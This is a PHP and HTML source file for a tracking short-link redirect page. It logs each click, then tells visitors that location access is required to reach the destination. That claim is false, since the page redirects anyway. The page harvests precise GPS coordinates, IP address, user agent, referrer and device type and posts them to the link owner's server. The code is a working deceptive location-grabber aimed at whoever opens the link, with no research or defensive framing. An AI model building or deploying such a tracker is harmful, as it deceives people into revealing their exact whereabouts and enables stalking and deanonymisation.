<?php
require_once('../config.php');

$db = connectDB();
$code = $_GET['code'] ?? '';

if ($code === '') {
  die('❌ Invalid tracking code.');
}

// Lookup link
$linkStmt = $db->prepare("SELECT * FROM geo_links WHERE short_code = ?");
$linkStmt->execute([$code]);
$link = $linkStmt->fetch(PDO::FETCH_ASSOC);

if (!$link) {
  die('❌ Tracking link not found.');
}

// Expiry & limit checks
if (
  ($link['expires_at'] && strtotime($link['expires_at']) < time()) ||
  ($link['click_limit'] && $link['click_count'] >= $link['click_limit'])
) {
  die('❌ Link expired or limit reached.');
}

// Get IP (as fallback)
function getUserIP() {
  return $_SERVER['HTTP_CLIENT_IP']
    ?? $_SERVER['HTTP_X_FORWARDED_FOR']
    ?? $_SERVER['REMOTE_ADDR']
    ?? 'UNKNOWN';
}
$ip = getUserIP();

// Referrer check
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$referrerLabel = trim($referrer) !== '' ? $referrer : 'Direct';

// Handle manual override (for diagnostics)
if (isset($_GET['ref']) && $_GET['ref'] === 'manual') {
  $referrerLabel = 'Manual';
}

// Update click count
$db->prepare("UPDATE geo_links SET click_count = click_count + 1 WHERE id = ?")->execute([$link['id']]);

// Store the destination URL for JavaScript to use after getting location
$destination = $link['original_url'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f8f9fa;
    }
    .container {
      text-align: center;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      background-color: white;
      max-width: 90%;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .btn {
      padding: 10px 20px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 20px;
    }
    .btn:hover {
      background-color: #218838;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="loading">
      <h2>Redirecting you to your destination...</h2>
      <div class="spinner"></div>
      <p>Please wait while we process your request.</p>
    </div>
    
    <div id="permission" class="hidden">
      <h2>Location Access Required</h2>
      <p>To continue to your destination, please allow location access when prompted.</p>
      <button id="locationBtn" class="btn">Continue to Site</button>
    </div>
    
    <div id="error" class="hidden">
      <h2>Unable to Access Location</h2>
      <p>We couldn't access your location. You'll be redirected shortly.</p>
    </div>
  </div>

  <script>
    // Store PHP variables for JavaScript use
    const linkId = <?= $link['id'] ?>;
    const destination = "<?= htmlspecialchars($destination) ?>";
    const ipAddress = "<?= htmlspecialchars($ip) ?>";
    const userAgent = "<?= htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Agent') ?>";
    const referrer = "<?= htmlspecialchars($referrerLabel) ?>";
    const deviceType = "<?= preg_match('/mobile/i', $_SERVER['HTTP_USER_AGENT']) ? 'Mobile' : 'Desktop' ?>";
    
    // Show permission request after a short delay
    setTimeout(() => {
      document.getElementById('loading').classList.add('hidden');
      document.getElementById('permission').classList.remove('hidden');
    }, 1500);
    
    // Handle location button click
    document.getElementById('locationBtn').addEventListener('click', () => {
      getLocationAndRedirect();
    });
    
    // Try to get precise location and then redirect
    function getLocationAndRedirect() {
      if (navigator.geolocation) {
        document.getElementById('permission').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        
        navigator.geolocation.getCurrentPosition(
          // Success callback
          (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Send location data to server
            fetch('save_precise_location.php', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                link_id: linkId,
                ip_address: ipAddress,
                user_agent: userAgent,
                referrer: referrer,
                latitude: latitude,
                longitude: longitude,
                accuracy: accuracy,
                device_type: deviceType
              })
            })
            .then(response => response.json())
            .then(data => {
              console.log('Success:', data);
              // Redirect to destination
              window.location.href = destination;
            })
            .catch(error => {
              console.error('Error:', error);
              // Redirect anyway if there's an error saving
              window.location.href = destination;
            });
          },
          // Error callback
          (error) => {
            console.error("Error getting location:", error);
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('error').classList.remove('hidden');
            
            // Fallback to IP-based tracking
            fetch('save_ip_location.php', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                link_id: linkId,
                ip_address: ipAddress,
                user_agent: userAgent,
                referrer: referrer,
                device_type: deviceType
              })
            });
            
            // Redirect after a short delay
            setTimeout(() => {
              window.location.href = destination;
            }, 2000);
          },
          // Options
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        // Geolocation not supported
        document.getElementById('permission').classList.add('hidden');
        document.getElementById('error').classList.remove('hidden');
        
        // Fallback to IP-based tracking
        fetch('save_ip_location.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            link_id: linkId,
            ip_address: ipAddress,
            user_agent: userAgent,
            referrer: referrer,
            device_type: deviceType
          })
        });
        
        // Redirect after a short delay
        setTimeout(() => {
          window.location.href = destination;
        }, 2000);
      }
    }
    
    // Auto-redirect after 15 seconds if user doesn't interact
    setTimeout(() => {
      if (!document.getElementById('loading').classList.contains('hidden') ||
          !document.getElementById('permission').classList.contains('hidden')) {
        window.location.href = destination;
      }
    }, 15000);
  </script>
</body>
</html>